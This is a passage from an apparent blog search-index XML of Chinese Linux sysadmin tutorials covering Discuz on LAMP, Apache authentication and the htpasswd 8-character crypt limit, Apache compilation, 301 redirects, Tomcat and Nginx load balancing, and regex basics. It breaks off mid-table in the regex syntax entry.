    <content type="text"><![CDATA[LAMP安装 Discuz！1.官方网站下载discuz！12345[root@lamp ~]# mkdir /data/www[root@lamp ~]# cd /data/www[root@lamp www]# wget http://download.comsenz.com/DiscuzX/3.2/Discuz_X3.2_SC_GBK.zip[root@lamp www]# unzip Discuz_X3.2_SC_GBK.zip[root@lamp www]# mv upload/* . &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删掉其他文件和压缩包 1[root@lamp www]# rm -rf readme/ utility/ upload/ Discuz_X3.2_SC_GBK.zip 2.配置第一个虚拟机&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除 httpd.conf 中的下面这行前面的警号 # 1#Include conf/extra/httpd-vhosts.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后编辑该配置文件 1[root@lamp www]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在最后面，加入如下配置： 12345&lt;VirtualHost *:80&gt; DocumentRoot "/data/www" ServerName www.test.com ServerAlias www.aaa.com&lt;/VirtualHost&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先检查配置是否正确 12[root@lamp www]# /usr/local/apache2/bin/apachectl -tSyntax OK &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启 apache 服务 1[root@lamp www]# /usr/local/apache2/bin/apachectl restart 3.配置 mysql ，给 Discuz！ 增加一个账户&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;给 mysql root 账户设置密码，谈后命令行进入 mysql ，创建新的库，并创建一个新的帐号对该库有所有权限： 1234567891011[root@lamp www]# /usr/local/mysql/bin/mysql -uroot mysql&gt; create database discuz;Query OK, 1 row affected (0.02 sec) mysql&gt; grant all on discuz.* to 'yanyi'@'localhost' identified by '123456';Query OK, 0 rows affected (0.00 sec) mysql&gt; quitBye &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就创建了一个库 discuz ，然后有创建了一个用户 yanyi ，密码是 123456. 4.安装 Discuz！&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为 www.test.com 这个域名是随便定义了一个，所以是不能直接访问的，需要先绑定 hosts ，其中hosts 在windows 和 linux 上都是存在的，可以把一个域名指向到一个 ip 上。windows 下的 hosts 文件路径是在： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;c:\windows\system32\drivers\etc\hosts 。用记事本打开，然后增加一行，保存： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;192.168.0.99 www.test.com www.aaa.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的 192.168.0.99 是虚拟机的 ip 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器输入： http://www.test.com/install/ 打开页面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据提示，修改对应目录的权限 12[root@lamp ~]# cd /data/www[root@lamp www]# chown -R daemon:daemon data uc_server/data uc_client/data config &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;让这几个目录支持 apache 运行帐号可写， deamon 就是 apache 的运行帐号，在 /usr/local/apache2/conf/httpd.conf 中用 User 和 Group 定义的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这一步，数据库名，就是第三步创建的新数据库。数据库用户名和密码也是第三步创建的用户和密码。管理员密码一定要记得。点下一步后，就会看到安装数据库的过程，然后到 “discuz 应用中心”的页面，直接点右下角“点此访问”，就安装成功discuz 论坛了。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache 用户认证]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F19.%20Apache%20%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81%2F</url>
    <content type="text"><![CDATA[Apache 用户认证&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候，需要给一些特殊的访问设置一个用户认证机制，增加安全。为了使 WEB 服务器更安全，需要将一些特定用户才能访问的目录设置用户认证，例如：网站后台登陆地址 ，可以再设置一层用户认证。 1[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在对应的虚拟主机配置中加入如下配置： 1234567&lt;Directory /data/www/admin.php&gt; AllowOverride AuthConfig AuthName "自定义的" AuthType Basic AuthUserFile /data/.htpasswd require valid-user &lt;/Directory&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：首先指定要对哪个目录进行验证， AuthName 自定义，AuthUserFile 指定用户密码文件在哪里。 1234[root@lamp ~]# /usr/local/apache2/bin/htpasswd -cm /data/.htpasswd yanyiNew password: Re-type new password: Adding password for user yanyi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这一步是要创建进行验证的用户，第一次要加个 -c 选项，目的就是为了创建 /data/.htpasswd 密码文件，回车后要输入要设定的密码就 ok 了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后重启 apache 服务 12[root@lamp ~]# /usr/local/apache2/bin/apachectl -tSyntax OK &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先检查配置是否正确 1[root@lamp ~]# /usr/local/apache2/bin/apachectl graceful &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里 graceful 相当于 reload 配置。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[htpasswd 默认创建的密码只有前8位有效]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F22.%20htpasswd%20%E9%BB%98%E8%AE%A4%E5%88%9B%E5%BB%BA%E7%9A%84%E5%AF%86%E7%A0%81%E5%8F%AA%E6%9C%89%E5%89%8D8%E4%BD%8D%E6%9C%89%E6%95%88%2F</url>
    <content type="text"><![CDATA[htpasswd 默认创建的密码只有前8位有效&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按照如下命令创建密码 1htpasswd -c .htpasswd user1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假如，密码为123456789 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么访问时，不管是输入 12345678 还是 123456789 甚至是 123456781234 都能顺利通过验证。这是为什么呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;htpasswd默认情况，是使用系统库中的crypt()函数来对密码明文进行单向加密的。在网上找到该函数的说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;crypt()将使用Data Encryption Standard(DES)演算法将参数key所指的字符串加以编码，key字符串长度仅取前8个字符，超过此长度的字符没有意义。参数salt为两个字 符组成的字符串，由a-z,A-Z,0-9,”.”,和”/“所组成，用来决定使用4096种不同内建表格的哪一个。函数执行成功后会返回指向编码过的字符串指针，参数key所指的字符串不会有所更动。编码过的字符串长度为13个字符，前两个字符为参数salt代表的字符串。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，如果你想创建超过8位的密码，请使用-m参数或者-s 参数，这两个参数分别表示创建的密码以MD5加密方式加密和以SHA方式加密。 1htpasswd -c -m .htpasswd user1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样创建的密码没有8位数限制了。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache编译安装]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F1.%20Apache%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Apache编译安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache也需要到官网下载合适的版本，目前使用较多的版本为2.0或者2.2建议下载2.2版本。Apache官网下载地址 实际上，我们所谓的 apache ，真正的名字叫 httpd 。 1.下载12[root@localhost mysql]# cd /usr/local/src/[root@localhost src]# wget http://syslab.comsenz.com/downloads/linux/httpd-2.2.16.tar.gz 2.解压1[root@localhost src]# tar zxvf httpd-2.2.16.tar.gz 3.配置编译参数123456789[root@localhost src]# cd httpd-2.2.16[root@localhost httpd-2.2.16]# ./configure \--prefix=/usr/local/apache2 \--with-included-apr \--enable-so \--enable-deflate=shared \--enable-expires=shared \--enable-rewrite=shared \--with-pcre &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;--prefix 指定安装到哪里， --enable-so 表示启用DSO 。DSO是Dynamic Shared Objects（动态共享目标）的缩写，它提供了一种在运行时将特殊格式的代码在程序运行需要时，将需要的部分从外存调入内存执行的方法。Apache 支持动态共享模块，也支持静态模块，静态的话，会把需要的目标直接编译进apache的可执行文件中，相比较动态，虽然省去了加载共享模块的步骤，但是也加大了二进制执行文件的空间，变得臃肿。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;--enable-deflate=shared 表示共享的方式编译deflate，后面的参数同理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那什么是动态共享，什么是静态？ apache 编译安装完成后会生成一个核心的二进制可执行文件叫做 httpd ，这个文件座位核心文件，提供服务时就是它在处理用户的请求，但是有一些功能，比如这里提到的 expires 就是配置静态文件（图片）过期时间的，也就是说图片可以在用户浏览器的临时缓存目录中缓存多久。这些功能是作为 httpd 的一个扩展模块来工作的，那么这种扩展模块有两种存在的方式，一种是直接在编译的时候和 httpd 文件拧到一起，组成一个体积大的文件，这种叫做静态。而另一种方式是，扩展模块作为一个独立的文件存在，只有在使用这个模块时再去调用它，这种叫做动态共享。两种方式中，动态的好处是，核心文件 httpd 比较小，模块随时用随时加载，耗费内存相对较少。而静态的优势是，在服务启动时，会把所有模块加载，用到时很快就执行，效率较高。建议倾向用动态。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果出现了这样的错误: 1error: mod_deflate has been requested but can not be built due to prerequisite failures &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1yum install -y zlib-devel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了避免在make的时候出现错误，所以最好是提前先安装好一些库文件: 1yum install -y pcre pcre-devel apr apr-devel 4.编译1[root@localhost httpd-2.2.16]# make 5.安装1[root@localhost httpd-2.2.16]# make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上两个步骤都可以使用 echo $? 来检查是否正确执行，否则需要根据错误提示去解决问题。 12[root@localhost httpd-2.2.16]# echo $?[root@localhost httpd-2.2.16]# 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为 0 则没有问题。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache域名301跳转]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F25.%20Apache%E5%9F%9F%E5%90%8D301%E8%B7%B3%E8%BD%AC%2F</url>
    <content type="text"><![CDATA[Apache域名301跳转&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个站点难免会有多个域名，而多个域名总得有一个主次，比如一个网站有两个域名访问，但不管用哪个域名访问，最终都会跳到其中固定的一个域名上去。这个行为就叫域名跳转， 301 只是一个状态码，跳转除了301 还有 302.如何配置跳转 1[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在对应的虚拟主机配置文件中加入 12345&lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteCond %&#123;HTTP_HOST&#125; ^www.aaa.com$ RewriteRule ^/(.*)$ http://www.test.com/$1 [R=301,L]&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存退出。 123[root@lamp ~]# apachectl -tSyntax OK[root@lamp ~]# apachectl graceful &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测配置是否错误，并重启 apache 服务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果是多个域名，这样设置： 123456&lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteCond %&#123;HTTP_HOST&#125; ^www.aaa.com [OR] RewriteCond %&#123;HTTP_HOST&#125; ^www.bbb.com$ RewriteRule ^/(.*)$ http://www.test.com/$1 [R=301,L]&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者： 12345&lt;IfModule mod_rewrite.c&gt; RewriteEngine on RewriteCond %&#123;HTTP_HOST&#125; !^www.test.com$ RewriteRule ^/(.*)$ http://www.test.com/$1 [R=301,L]&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启 apache 后，在浏览器访问 www.aaa.com 会直接跳转到 www.test.com 。也可以直接在 linux 命令下使用 curl 命令。 123456[root@lamp ~]# curl -x127.0.0.1:80 www.aaa.com -IHTTP/1.1 301 Moved PermanentlyDate: Thu, 05 Jan 2017 03:36:42 GMTServer: Apache/2.2.31 (Unix) PHP/5.6.6Location: http://www.test.com/Content-Type: text/html; charset=iso-8859-1]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache如何在虚拟主机中实现用户验证]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F21.%20apache%E5%A6%82%E4%BD%95%E5%9C%A8%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E4%B8%AD%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E9%AA%8C%E8%AF%81%2F</url>
    <content type="text"><![CDATA[apache如何在虚拟主机中实现用户验证&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虚拟主机配置文件中，需要加入 1AllowOverride AuthConfig &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在虚拟主机的主目录，即DocumentRoot 目录下 1vim /data/web/test/.htaccess &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入 1234AuthName "frank share web" AuthType Basic AuthUserFile /data/web/test/.htpasswdrequire valid-user &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后，然后创建apache的验证用户 1htpasswd -c /data/web/test/.htpasswd test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一次创建用户要用到-c 参数 第2次添加用户，就不用-c参数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想修改密码，可以如下 1htpasswd -m .htpasswd test2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启apache，即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到此，已经配置完成。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面介绍另一种方式： 1vim http.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在相应的虚拟主机配置文件段，加入 1234AllowOverride AuthConfigAuthName "自定义的"AuthType BasicAuthUserFile /data/.htpasswd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的/data/.htpasswd你可以随便写一个路径或名字，没有限制 1require valid-user &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后，然后创建apache的验证用户 1htpasswd -cm /data/.htpasswd test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加第二个用户的时候，就不要加-c了，因为-c是创建的意思，如果加上会把这个文件重写。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tomcat配置和优化]]></title>
    <url>%2F2017%2F08%2F10%2FTomcat%2F3.%20tomcat%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[tomcat配置和优化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tomcat 的安装步骤非常简单，但是还需要学会如何去做简单的配置。tomcat 默认启动的是 8080，如果想修改成 80，则需要修改 sercer.xml 文件： 1[root@192 src]# vim /usr/local/tomcat/conf/server.xml &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;找到 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;找到 下一行插入新的 内容如下 12345&lt;Host name="www.123.com" appBase="/data/tomcatweb"unpackWARs="false" autoDeploy="true"xmlValidation="false" xmlNamespaceAware="false"&gt;&lt;Context path="" docBase="" debug="0" reloadable="true" crossContext="true"/&gt;&lt;/Host&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后，重启 tomcat 12[root@192 src]# service tomcat stop[root@192 src]# service tomcat start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该脚本并不支持 restart ，所以只能先 stop 然后再 start 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面测试 jsp 解析 1[root@192 src]# vim /data/tomcatweb/111.jsp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内容如下 123&lt;html&gt;&lt;body&gt;&lt;center&gt; Now time is: &lt;%=new java.util.Date()%&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后访问，看结果 1234[root@192 src]# curl -xlocalhost:80 www.123.com/111.jsp&lt;html&gt;&lt;body&gt;&lt;center&gt; Now time is: Sat Apr 01 21:42:44 CST 2017&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx + Tomcat 配置负载均衡集群]]></title>
    <url>%2F2017%2F08%2F10%2FTomcat%2F7.%20Nginx%20%2B%20Tomcat%20%E9%85%8D%E7%BD%AE%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E9%9B%86%E7%BE%A4%2F</url>
    <content type="text"><![CDATA[Nginx + Tomcat 配置负载均衡集群一、Hello world前期环境准备 准备两个解压版tomcat，如何同时启动两个tomcat，请看我的另一篇文章《一台机器同时启动多个tomcat》。 nginx官网下载解压版nginx。 创建一个简单的web项目。为了直观的区分访问的哪个tomcat，在页面写上标记8081、8082。 分别部署到对应的tomcat下。如图： 配置nginx&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入nginx-1.10.1conf路径，修改配置文件nginx.conf。 配置服务器组，在http{}节点之间添加upstream配置。（注意不要写localhost，不然访问速度会很慢） 1234upstream nginxDemo &#123;server 127.0.0.1:8081; #服务器地址1server 127.0.0.1:8082; #服务器地址2&#125; 修改nginx监听的端口号80，改为8080。 1234server &#123; listen 8080; ......&#125; 在location{}中，利用proxy_pass配置反向代理地址；此处“http://”不能少，后面的地址要和第一步upstream定义的名称保持一致。 12345location / &#123;root html;index index.html index.htm;proxy_pass http://nginxDemo; #配置方向代理地址&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如下图： 启动nginx和tomcat，访问&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我是Windows系统，所以直接在nginx-1.10.1目录下双击nginx.exe即可。可在任务管理器中查看 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后在浏览器输入地址：http://localhost:8080/nginxDemo/index.jsp，每次访问就会轮流访问tomcat了（如果F5刷新不管用，建议试试鼠标指针放到地址栏，点击Enter键）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到这里，一个非常简单的负载均衡就配置完成了，是不是很简单呢，O(∩_∩)O哈哈~ 二、nginx负载均衡策略轮询（默认）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个web请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。 1234upstream nginxDemo &#123; server 127.0.0.1:8081; server 127.0.0.1:8082;&#125; 最少链接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;web请求会被转发到连接数最少的服务器上。 12345upstream nginxDemo &#123; least_conn; server 127.0.0.1:8081; server 127.0.0.1:8082;&#125; weight 权重&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况，weight默认是1。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;服务器A和服务器B的访问比例为：2-1;比如有3个请求，前两个会访问A，三个访问B，其它规则和轮询一样。 1234upstream nginxDemo &#123; server 127.0.0.1:8081 weight=2; #服务器A server 127.0.0.1:8082; #服务器B&#125; ip_hash&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个请求按访问ip的hash值分配，这样同一客户端连续的Web请求都会被分发到同一服务器进行处理，可以解决session的问题。当后台服务器宕机时，会自动跳转到其它服务器。 12345upstream nginxDemo &#123; ip_hash; server 127.0.0.1:8081 weight=2; #服务器A server 127.0.0.1:8082; #服务器B&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基于weight的负载均衡和基于ip_hash的负载均衡可以组合在一起使用。 url_hash（第三方）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;url_hash是nginx的第三方模块，nginx本身不支持，需要打补丁。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存服务器、文件服务器、静态服务器时比较有效。缺点是当后端服务器宕机的时候，url_hash不会自动跳转的其他缓存服务器，而是返回给用户一个503错误。 12345upstream nginxDemo &#123; server 127.0.0.1:8081; #服务器A server 127.0.0.1:8082; #服务器B hash $request_url;&#125; fair（第三方）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按后端服务器的响应时间来分配请求，响应时间短的优先分配。 12345upstream nginxDemo &#123; server 127.0.0.1:8081; #服务器A server 127.0.0.1:8082; #服务器B fair;&#125;]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式-简介]]></title>
    <url>%2F2017%2F08%2F10%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F1.%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[正则表达式-简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式（Regular Expression）是一种文本模式，包括普通字符和特殊字符。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式是繁琐的，但它是强大的，许多程序设计语言都支持利用正则表达式进行字符串操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，使用 ? 和 * 通配符来查找硬盘上的文件。? 通配符匹配文件名中的单个字符，而 * 通配符匹配零个或多个字符。像 data?.dat 这样的模式将查找下列文件： 1234data1.datdata2.datdatax.datdataN.dat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 字符代替 ？ 字符扩大了找到的文件数量。data.dat 匹配烈夏所有文件： 123456data.datdata1.datdata2.datdata12.datdatax.datdataXYZ.dat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;尽管这种搜索方法很有用，但它还是有限的。通过理解 * 通配符的工作原理，引入了正则表达式所依赖的概念，但正则表达式功能强大，而且更加灵活。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式的使用，可以通过简单的办法来实现强大的功能。下面一个简单的示例： \^[0-9]+abc$ ^ 为匹配输入字符串的开始位置。 [0-9]+ 匹配多个数字，[0-9] 匹配单个数字，+ 匹配一个或者多个。 abc$ 匹配字母 abc 并以 abc 结尾， $ 为匹配输入字符串的结束位置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例：匹配以数字开头，并以 abc 结尾的字符串： 123var str = "123abc";var parr1 = /^[0-9]+abc$/;document.write(str.match(patt1)); &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上标记的文本是获得的匹配的表达式：123abc 为什么使用正则表达式？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;典型的搜索和替换操作要求提供与预期的搜索结果匹配的确切文本。随谈这种技术对于静态文件执行简单搜索和替换任何可能已经足够了，但它缺乏灵活性，若采用这种方法搜索动态文本，几十不是不可能，至少也会变得很困难。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过是有那个正则表达式，可以： 测试字符串内的模式。例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这成为数据验证。 替换文本。可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。 基于模式匹配从字符串中提取子字符串。可以查找文档内或输入域内特定的文本。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，可能需要搜索整个网站，删除过时的材料，以及替换某些 HTML 格式标记。在这种情况下，可以正则表达式来确定在每个文件中是否出现该材料或该 HTML 格式标记。此过程将受影响的文件裂变缩小到包含需要删除或更改的材料的那些文件。然后可以使用正则表达式来删除过世的材料。最后，可以使用正则表达式来搜索和替换标记。 发展历史&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式的“祖先”可以一直上溯至对人类神经系统如何工作的早期研究。Warren McCulloch 和 Walter Pitts 这两位神经胜利学家研究出一种数学方式来描述这些神经网络。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1956年，一位叫 Stephen Kleene 的数学家在 McCulloch 和 Pitts 早期工作的基础上，发表了一篇标题为“神经网时间的表示法”的论文，引入了正则表达式的概念。正则表达式就是用来描述他称为“正则集的代数”的表达式，因此采用“正则表达式”这个术语。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;随后，发现可以将这一工作应用于使用 Ken Thompson 的计算搜索算法的一些早期研究，Ken Thompson 是 Unix 的主要发明人，正则表达式的第一个实用应用程序就是 Unix 中的 qed 编辑器。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如他们所说，剩下的就是众所周知的历史了。从那时起直至现在正则表达式都是基于文件的表机器和搜索工具中的一个重要部分。 应用领域&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目前，正则表达式已经在很多软件中得到广泛应用，包括 Linux、Unix、HP等操作系统， PHP、C#、Java等开发环境，以及很多的应用软件中，都可以看到正则表达式的影子 命令或环境 . [] ^ $ \(\) \{\} ? + \ () vi √ √ √ √ √ Visual C++ √ √ √ √ √ awk √ √ √ √ awk是支持该语法的， 只是要在命令行加入 –posix or –re-interval参数即可， 可见man awk中的interval expression √ √ √ √ sed √ √ √ √ √ √ delphi √ √ √ √ √ √ √ √ √ python √ √ √ √ √ √ √ √ √ java √ √ √ √ √ √ √ √ √ √ javascript √ √ √ √ √ √ √ √ √ php √ √ √ √ √ perl √ √ √ √ √ √ √ √ √ C# √ √ √ √ √ √ √ √]]></content>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式-语法]]></title>
    <url>%2F2017%2F08%2F10%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F2.%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[正则表达式-语法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式（regular expression）描述了一种字符串匹配的模式（pattern），可以 用来检查一个串是否含有某种子串。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将匹配的子串替换或者从某个串中取出符合某个条件的子串等。 runoo+b ，可以匹配 runoob、runooob、runoooooob等，+ 号代表前面的字符必须至少出现一次（1次或多次）。 runoo*b ，可以匹配runob、runoob、runoooooob等，* 号代表字符可以不出现，也可以出现一次或多次（0次、1次、或多次）。 colou?r ，可以匹配color或者colour，？问号代表前面的字符最多只可以出现一次（0次、1次）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;构造正则表达式的方法和创建数学表达式的方法一样。也就是用多种元字符与运算符可以将小的表达式结合在一起来创建更大个表达式。正则表达式的组件可以是单个的字符、字符集合、字符范围、字符间的选择或者所有这些组件的任意组合。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式是由普通字符（如字符a到z）以及特殊字符（称为“元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模版，将某个字符模式与所搜索的字符串进行匹配 普通字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;普通字符包括没有显示指定为元字符的所有可打印和不可打印的字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。 非打印字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;非打印字符也可以是正则表达式的组成部分。下标列出了表示非打印字符的转义序列： 字符 描述 \cx 匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \f 匹配一个换页符。等价于 \x0c 和 \cL。 \n 匹配一个换行符。等价于 \x0a 和 \cJ。 \r 匹配一个回车符。等价于 \x0d 和 \cM。 \s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。 \S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。 \t 匹配一个制表符。等价于 \x09 和 \cI。 \v 匹配一个垂直制表符。等价于 \x0b 和 \cK。 特殊字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所谓特殊字符，就是一些有特殊含义的字符，如上面说的 runoo*b 中的 *，简单的说就是表示任何字符串的意思。如果要查找字符串中的 * 符号，则需要对 * 进行转义，即在其前加一个 \: runo\*ob 匹配 runo*ob。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\ 放在它们前面。下表列出了正则表达式中的特殊字符： 特别字符 描述 $ 